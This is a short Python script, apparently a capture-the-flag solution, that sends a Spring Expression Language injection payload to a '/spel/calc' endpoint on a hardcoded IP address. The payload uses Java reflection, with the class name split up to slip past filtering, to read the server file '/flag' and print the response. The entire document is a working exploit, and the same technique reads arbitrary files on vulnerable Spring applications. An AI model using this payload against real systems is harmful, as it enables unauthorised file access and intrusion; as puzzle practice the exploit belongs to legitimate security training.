# coding=utf-8
import base64
import requests

def get_flag(target):
    payload = '1.class.forName("java.nio.file.Files").getMethod("readAllLines", 1.class.forName("java.nio.file.Path")).invoke(null, 1.class.forName("java.nio.file.Paths").getMethod("get", 1.class.forName("java.net.URI")).invoke(null, 1.class.forName("java.net.URI").getMethod("create", 1.class.forName("java.la"+"ng.Str"+"ing")).invoke(null, "file:///flag")))'
    print("payload", payload)
    url = "http://{}/spel/calc".format(target)
    r = requests.get(url, params={"calc": payload})
    print(r.request.url)
    print(r.text)


if __name__ == '__main__':
    get_flag("106.52.164.141")